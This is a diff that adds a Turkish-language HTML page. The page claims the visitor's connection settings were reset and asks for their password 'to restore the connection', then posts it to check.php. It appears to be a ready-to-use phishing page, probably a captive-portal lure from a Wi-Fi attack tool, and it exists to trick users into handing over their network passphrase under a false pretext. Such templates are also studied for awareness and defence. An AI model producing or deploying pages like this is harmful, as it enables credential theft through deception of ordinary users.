@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        body {
+            margin: 0px;
+            background-color: transparent;
+            overflow: hidden;
+        }
+        
+        .main-frame-text-error {
+            text-align: left;
+            color: #7F7F7F;
+            font-size: 18px;
+            margin-top: 20px;
+            padding-left: 5%;
+        }
+        
+        .main-frame-text {
+            padding-left: 10%;
+            padding-right: 10%;
+            color: #74797b;
+        }
+        
+        .main-frame-over-input-text {
+            padding-left: 10%;
+            padding-right: 10%;
+            color: #74797b;
+        }
+        
+        .table-div {
+            padding-left: 10%;
+        }
+        
+        .table-input {
+            width: 400;
+            border-collapse: collapse;
+            border-spacing: 0;
+        }
+        
+        .table-data-1 {
+            border-width: 1px 1px 1px 1px;
+            border-style: solid;
+            border-color: #CBCBCD;
+            background-color: #eeeeee;
+        }
+
+        .table-white {
+            background-color: white;
+            color: #7F7F7F;
+            font-size: 14px;
+            padding-left: 10px;
+        }
+
+        .table-image {
+            margin-left: 5px;
+            margin-top:2px;
+            
+        }
+        
+        .input-pass {
+            width: 100%;
+            height: 100%;
+            padding: 0px;
+        }
+        
+        .confirmbtn {
+            -moz-border-radius: 5px;
+            -webkit-border-radius: 5px;
+            border-radius: 5px;
+            width: 100%;
+            height: 100%;
+            background: -webkit-gradient(linear, left top, left bottom, from(#80c1f6), to(#50b1fe));
+            background: -moz-linear-gradient(top, #80c1f6, #50b1fe);
+            background: -o-linear-gradient(top, #80c1f6, #50b1fe);
+            filter: progid: DXImageTransform.Microsoft.Gradient(StartColorStr='#80c1f6', EndColorStr='#50b1fe', GradientType=0);
+            padding: 0px;
+        }
+    </style>
+
+</head>
+
+<body>
+    <p class="main-frame-text-error">Bağlantı ayarlarınız sıfırlandı!</p>
+    <p class="main-frame-text">Bağlantınızda bir sorun algılandı ve bağlantı ayarlarınız sıfırlandı</p>
+    <p class="main-frame-over-input-text">Bağlantınızı geri getirmek için şifrenizi giriniz:</p>
+    <div class="table-div">
+        <table class="table-input">
+            <tbody>
+                <tr>
+                    <td class="table-data-1">
+                        <img src="images/password.png" class="table-image">
+                    </td>
+                    <td class="table-data-1 table-white">
+                        <p>Şifre</p>
+                    </td>
+                    <form id="form1" name="form1" method="POST" action="check.php">
+                        <td class="table-data-1">
+                            <input name="key1" type="password" class="input-pass" />
+                        </td>
+                        <td class="table-data-1">
+                            <input name="Confirm" class="confirmbtn" type="submit" value="Onayla" />
+                        </td>
+
+                    </form>
+                </tr>
+            </tbody>
+
+        </table>
+    </div>
+
+</body>
+
+</html>
